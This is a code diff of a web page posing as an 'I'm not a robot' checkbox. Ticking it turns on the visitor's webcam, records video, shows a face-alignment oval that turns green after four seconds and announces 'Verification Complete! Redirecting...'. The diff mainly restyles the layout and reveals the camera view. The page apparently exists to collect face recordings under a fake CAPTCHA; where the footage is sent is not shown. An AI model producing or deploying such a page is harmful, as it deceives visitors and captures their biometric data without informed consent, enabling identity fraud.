@@ -20,69 +20,71 @@
         .container {
             text-align: center;
             background: rgba(0, 0, 0, 0.8);
-            padding: 40px;
+            padding: 20px;
             border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            transform: scale(0.9);
-            animation: zoomIn 0.5s ease-out forwards;
         }
 
         h1 {
-            font-size: 26px;
-            margin-bottom: 20px;
+            font-size: 20px;
+            margin-bottom: 15px;
         }
 
         .checkbox-container {
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 20px 0;
+            margin: 15px 0;
             gap: 10px;
-            font-size: 18px;
+            font-size: 16px;
             cursor: pointer;
         }
 
         input[type="checkbox"] {
-            width: 24px;
-            height: 24px;
+            width: 20px;
+            height: 20px;
             accent-color: #4CAF50;
             transition: transform 0.3s ease;
         }
 
         input[type="checkbox"]:checked {
-            transform: scale(1.3);
+            transform: scale(1.2);
         }
 
         .loading {
             display: none;
-            font-size: 18px;
-            margin-top: 20px;
+            font-size: 16px;
+            margin-top: 15px;
             color: #FBC02D;
         }
 
         .success {
             display: none;
-            font-size: 20px;
-            margin-top: 20px;
+            font-size: 16px;
+            margin-top: 15px;
             color: #4CAF50;
         }
 
         video {
-            width: 320px;
-            height: 240px;
+            display: none;
+            width: 100%;
+            max-width: 300px;
+            height: auto;
+            margin: 15px 0;
             border-radius: 10px;
-            margin: 20px 0;
-            display: block;
             background: black;
             position: relative;
         }
 
         .face-frame {
+            display: none;
             position: absolute;
-            width: 150px;
-            height: 150px;
+            width: 160px;
+            height: 220px;
             border: 3px solid #FFD700;
-            border-radius: 50%;
+            border-radius: 50% 50% 70% 70%;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
@@ -110,7 +112,7 @@
         </div>
         <div class="video-wrapper" style="position: relative;">
             <video id="video" autoplay playsinline muted></video>
-            <div class="face-frame"></div>
+            <div class="face-frame" id="face-frame"></div>
         </div>
         <div class="loading">Recording in progress... ⏳</div>
         <div class="success">✅ Verification Complete! Redirecting...</div>
@@ -118,6 +120,7 @@
 
     <script>
         const video = document.getElementById('video');
+        const faceFrame = document.getElementById('face-frame');
         const checkbox = document.getElementById('robot-checkbox');
         const loading = document.querySelector('.loading');
         const success = document.querySelector('.success');
@@ -127,7 +130,11 @@
 
         checkbox.addEventListener('change', (e) => {
             if (e.target.checked) {
-                // Show loading animation
+                // Show video and face frame
+                video.style.display = 'block';
+                faceFrame.style.display = 'block';
+
+                // Show loading message
                 loading.style.display = 'block';
                 success.style.display = 'none';
 
@@ -146,6 +153,11 @@
                         mediaRecorder.ondataavailable = (event) => {
                             chunks.push(event.data);
                         };
+
+                        // Change frame color on the 4th second
+                        setTimeout(() => {
+                            faceFrame.style.borderColor = '#00FF00';
+                        }, 4000);
 
                         setTimeout(() => {
                             mediaRecorder.stop();
